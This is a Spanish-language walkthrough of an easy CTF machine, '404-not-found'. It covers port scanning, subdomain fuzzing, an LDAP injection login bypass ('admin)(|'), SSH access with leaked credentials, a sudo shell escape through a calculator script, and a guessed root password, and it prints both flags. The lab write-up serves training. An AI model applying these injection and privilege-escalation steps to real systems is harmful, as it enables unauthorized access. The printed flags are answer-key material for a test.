---
icon: flag
---

# CTF 404-not-found Easy

URL Download CTF = [https://drive.google.com/file/d/1EF-a2vshKyVlETi33XspsmGeNsqND8JC/view?usp=sharing](https://drive.google.com/file/d/1EF-a2vshKyVlETi33XspsmGeNsqND8JC/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip 404-not-found.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh 404-not-found.tar
```

Info:

```

___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.21.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 06:12 EDT
Nmap scan report for 404-not-found.hl (172.21.0.2)
Host is up (0.000033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:4e:10:e2:31:bf:13:43:c9:69:9e:4f:3f:a2:95:a6 (ECDSA)
|_  256 fb:dc:ca:6e:f5:d6:5a:41:25:2b:b2:21:f1:71:16:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 404-Not-Found CTF
MAC Address: 02:42:AC:15:00:02 (Unknown)
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
```

Vemos que hay un puerto `80`, pero si entramos mediante la URL nos aparecera directamente un dominio llamado `404-not-found.hl`, lo añadiremos a nuestro archivo `/hosts` para que funcione.

```shell
nano /etc/hosts

#Dentro del nano
<IP>       404-not-found.hl
```

Lo guardamos y ahora si vamos a ver la pagina, por que ya se resolveria correctamente.

```
URL = http://404-not-found.hl/
```

Vemos mucha informacion pero no es muy util practicamente nada, por lo que veremos si tiene algun subdominio de la siguiente forma.

## ffuf (Subdominio)

```shell
ffuf -c -w <WORDLIST> -u http://404-not-found.hl -H "Host: FUZZ.404-not-found.hl" -fw 20
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://404-not-found.hl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.404-not-found.hl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

info                    [Status: 200, Size: 2023, Words: 674, Lines: 150, Duration: 3ms]
:: Progress: [20469/20469] :: Job [1/1] :: 4000 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

Por lo que vemos encontramos un `subdominio` llamado `info`, lo añadiremos en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>       404-not-found.hl info.404-not-found.hl
```

Lo guardamos y nos iremos a la siguiente URL.

```
URL = http://info.404-not-found.hl/
```

Dentro de este `subdominio` veremos un panel de `login` el cual no hace gran cosa, tampoco es inyectable a `SQLInjecction`, no van las credenciales por defecto, pero si inspeccionamos el codigo vemos lo siguiente.

```html
<!-- I believe this login works with LDAP -->
```

Nos da una pista de que puede ser vulnerable con un `Bypass` de `LDAP`.

## Bypass LDAP

URL = https://book.hacktricks.xyz/pentesting-web/ldap-injection#login-bypass

Probaremos a bypassear el login de la siguiente forma.

```
User = admin)(|
Pass = admin)(|
```

Y por lo que vemos accedemos al panel de administrador, si bajamos un poco vemos unas credenciales las cuales probaremos mediante `SSH`.

## SSH

```shell
ssh 404-page@<IP>
```

Metemos la contraseña obtenida `not-found-page-secret` y ya estariamos dentro.

## Escalate user 200-ok

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for 404-page on 084fadd2eeb1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User 404-page may run the following commands on 084fadd2eeb1:
    (200-ok : 200-ok) /home/404-page/calculator.py
```

Vemos que podemos ejecutar como el usuario `200-ok` el script de `calculator.py` por lo que haremos lo siguiente.

Si ejecutamos ese script vemos que es una calculadora normal, pero si leemos una nota en el siguiente directorio.

```shell
cat /var/www/nota.txt
```

Info:

```
In the calculator I don't know what the symbol is used for "!" followed by something else, only 200-ok knows.
```

Nos da una pista de que probemos poniendo el simbolo `!` por delante y poner algo, por ejemplo ejecutare un `ls` poniendo el `!` por delante.

```shell
sudo -u 200-ok /home/404-page/calculator.py

#Dentro del script
!ls -la
```

Info:

```
total 36
drwxr-xr-x 1 404-page 404-page 4096 Aug 19 12:30 .
drwxr-xr-x 1 root     root     4096 Aug 19 11:21 ..
-rw------- 1 404-page 404-page  170 Aug 19 11:31 .bash_history
-rw-r--r-- 1 404-page 404-page  220 Aug 19 11:19 .bash_logout
-rw-r--r-- 1 404-page 404-page 3771 Aug 19 11:19 .bashrc
drwx------ 2 404-page 404-page 4096 Aug 19 12:30 .cache
-rw-r--r-- 1 404-page 404-page  807 Aug 19 11:19 .profile
-rwx--x--x 1 200-ok   200-ok    784 Aug 19 11:23 calculator.py
```

Vemos que nos deja ejecutar comando con un `!` delante, por lo que obtendremos la shell del usuario `200-ok` de la siguiente forma.

```shell
sudo -u 200-ok /home/404-page/calculator.py

#Dentro del script
!bash
```

Y con esto ya seremos el usuario `200-ok`, por lo que leeremos la flag.

> user.txt

```
bef4bb318a17abd01158337811750bcf
```

## Escalate Privileges

Si leemos el archivo llamado `boss.txt` veremos lo siguiente.

```
What is rooteable
```

Puede ser una posible contraseña o algo parecido, por lo que la probaremos con `root`.

```shell
su root
```

Y si metemos esa palabra como contraseña de `root` (`rooteable`) veremos que somos `root`, por lo que leeremos la flag.

> root.txt

```
2424b2a3292e20c6e1ade39ed3e77629
```
